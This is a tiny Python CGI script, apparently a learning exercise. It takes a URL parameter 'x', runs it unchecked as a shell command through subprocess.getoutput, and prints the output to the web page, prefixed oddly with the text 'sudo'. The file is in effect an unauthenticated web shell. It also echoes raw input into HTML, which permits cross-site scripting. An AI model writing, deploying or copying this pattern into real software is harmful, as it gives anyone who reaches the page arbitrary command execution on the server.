import subprocess
import cgi
print("content-type: text/html")
print()
mydata = cgi.FieldStorage()
myx = mydata.getvalue("x")
print(myx)
o = subprocess.getoutput(myx)
print("sudo" + o)
